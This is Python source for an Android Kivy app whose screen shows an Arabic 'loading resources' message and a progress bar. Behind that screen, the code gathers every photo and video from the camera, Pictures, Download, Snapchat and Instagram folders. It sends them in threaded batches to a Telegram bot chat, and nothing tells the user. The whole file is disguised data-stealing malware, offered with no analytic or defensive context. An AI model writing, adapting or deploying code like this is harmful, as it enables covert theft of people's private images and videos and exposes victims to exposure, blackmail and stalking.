import os
import time
import threading
import requests
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.progressbar import ProgressBar
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.graphics import Color, Rectangle

Window.clearcolor = (0.1, 0.1, 0.1, 1)

TOKEN = "TOKEN_HERE"
CHAT_ID = "CHAT_ID_HERE"

class Uploader:
    def __init__(self):
        self.session = requests.Session()
        self.done = 0
        self.all = 0
        self.percent = 0
        self.running = True
        self.video_types = {'.mp4', '.3gp', '.mov'}
        self.image_types = {'.jpg', '.jpeg', '.png'}
    
    def get_videos(self):
        found = []
        camera = "/storage/emulated/0/DCIM/Camera"
        if os.path.exists(camera):
            for item in os.listdir(camera):
                if os.path.splitext(item)[1].lower() in self.video_types:
                    found.append(os.path.join(camera, item))
        return found
    
    def get_images(self):
        found = []
        locations = [
            "/storage/emulated/0/DCIM",
            "/storage/emulated/0/Pictures",
            "/storage/emulated/0/Download",
            "/storage/emulated/0/Snapchat",
            "/storage/emulated/0/Instagram"
        ]
        
        for loc in locations:
            if os.path.exists(loc):
                for root, dirs, files in os.walk(loc):
                    for file in files:
                        if os.path.splitext(file)[1].lower() in self.image_types:
                            found.append(os.path.join(root, file))
        return found
    
    def upload(self, path, is_video):
        try:
            if is_video:
                url = f"https://api.telegram.org/bot{TOKEN}/sendVideo"
                files = {'video': open(path, 'rb')}
            else:
                url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
                files = {'photo': open(path, 'rb')}
            
            data = {'chat_id': CHAT_ID}
            self.session.post(url, files=files, data=data, timeout=15)
            files['video' if is_video else 'photo'].close()
            
            self.done += 1
            self.percent = (self.done / self.all) * 100
            return True
        except:
            return False
    
    def start(self):
        videos = self.get_videos()
        images = self.get_images()
        
        files_list = []
        files_list.extend([(p, True) for p in videos])
        files_list.extend([(p, False) for p in images])
        
        self.all = len(files_list)
        self.done = 0
        
        if self.all == 0:
            return
        
        for i in range(0, len(files_list), 5):
            if not self.running:
                break
            
            batch = files_list[i:i+5]
            threads_list = []
            
            for file_path, is_vid in batch:
                t = threading.Thread(target=self.upload, args=(file_path, is_vid))
                t.start()
                threads_list.append(t)
            
            for t in threads_list:
                t.join()
            
            time.sleep(0.2)

class LoaderApp(App):
    def build(self):
        self.root_box = BoxLayout(orientation='vertical', padding=50, spacing=40)
        
        with self.root_box.canvas.before:
            Color(0.15, 0.15, 0.15, 1)
            self.bg = Rectangle(size=Window.size, pos=self.root_box.pos)
        
        self.text_label = Label(
            text="انتظر جاري تحميل الموارد",
            font_size=28,
            color=(0.9, 0.9, 0.9, 1),
            bold=True
        )
        
        self.bar = ProgressBar(max=100, height=35)
        
        self.percent_label = Label(
            text="0%",
            font_size=26,
            color=(0, 0.8, 1, 1),
            bold=True
        )
        
        self.root_box.add_widget(self.text_label)
        self.root_box.add_widget(self.bar)
        self.root_box.add_widget(self.percent_label)
        
        self.uploader = Uploader()
        Clock.schedule_once(self.begin, 2)
        
        return self.root_box
    
    def begin(self, dt):
        threading.Thread(target=self.process).start()
        Clock.schedule_interval(self.refresh, 0.1)
    
    def process(self):
        self.uploader.start()
    
    def refresh(self, dt):
        progress = self.uploader.percent
        self.bar.value = progress
        self.percent_label.text = f"{int(progress)}%"
        
        if progress >= 100:
            self.text_label.text = "اكتمل التحميل"
            self.percent_label.color = (0, 1, 0, 1)
            return False

if __name__ == "__main__":
    LoaderApp().run()
